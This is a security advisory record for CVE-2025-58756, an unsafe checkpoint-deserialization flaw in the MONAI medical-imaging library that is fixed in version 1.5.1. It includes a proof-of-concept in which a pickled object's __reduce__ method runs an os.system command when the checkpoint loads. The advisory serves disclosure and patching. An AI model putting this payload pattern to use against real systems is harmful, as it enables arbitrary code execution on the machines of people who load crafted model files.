---
identifier: "CVE-2025-58756"
identifiers:
- "CVE-2025-58756"
- "GHSA-6vm5-6jv9-rjpj"
package_slug: "pypi/monai"
title: "MONAI: Unsafe torch usage may lead to arbitrary code execution"
description: "In ```model_dict = torch.load(full_path, map_location=torch.device(device),
  weights_only=True)``` in monai/bundle/scripts.py , ```weights_only=True``` is loaded
  securely. However, insecure loading methods still exist elsewhere in the project,
  such as when loading checkpoints.\n\nThis is a common practice when users want to
  reduce training time and costs by loading pre-trained models downloaded from platforms
  like huggingface.\n\nLoading a checkpoint containing malicious content can trigger
  a deserialization vulnerability, leading to code execution.\n\nThe following proof-of-concept
  demonstrates the issues that arise when loading insecure checkpoints.\n\n```\n\nimport
  os\nimport tempfile\nimport json\nimport torch\nfrom pathlib import Path\n\nclass
  MaliciousPayload:\ndef __reduce__(self):\nreturn (os.system, ('touch /tmp/hacker2.txt',))\n\ndef
  test_checkpoint_loader_attack():\n\n\n\ntemp_dir = Path(tempfile.mkdtemp())\ncheckpoint_file
  = temp_dir / \"malicious_checkpoint.pt\"\n\n\nmalicious_checkpoint = {\n'model_state_dict':
  MaliciousPayload(),\n'optimizer_state_dict': {},\n'epoch': 100\n}\n\n\ntorch.save(malicious_checkpoint,
  checkpoint_file)\n\n\nfrom monai.handlers import CheckpointLoader\nimport torch.nn
  as nn\n\n\nmodel = nn.Linear(10, 1)\n\nloader = CheckpointLoader(\nload_path=str(checkpoint_file),\nload_dict={\"model\":
  model}\n)\n\nclass MockEngine:\ndef __init__(self):\nself.state = type('State',
  (), {})()\nself.state.max_epochs = None\nself.state.epoch = 0\n\nengine = MockEngine()\nloader(engine)\n\n\nproof_file
  = \"/tmp/hacker2.txt\"\nif os.path.exists(proof_file):\nprint(\"Succes\")"
date: "2025-09-26"
pubdate: "2025-09-09"
affected_range: "<1.5.1"
fixed_versions:
- "1.5.1"
affected_versions: "All versions before 1.5.1"
not_impacted: "All versions starting from 1.5.1"
solution: "Upgrade to version 1.5.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2025-58756"
- "https://github.com/advisories/GHSA-6vm5-6jv9-rjpj"
- "https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj"
- "https://github.com/Project-MONAI/MONAI/pull/8566"
- "https://github.com/Project-MONAI/MONAI/commit/948fbb703adcb87cd04ebd83d20dcd8d73bf6259"
- "https://github.com/Project-MONAI/MONAI"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
uuid: "faf17977-8dca-4407-b7f6-56a2d1ac274b"
cwe_ids:
- "CWE-502"
- "CWE-937"
- "CWE-1035"
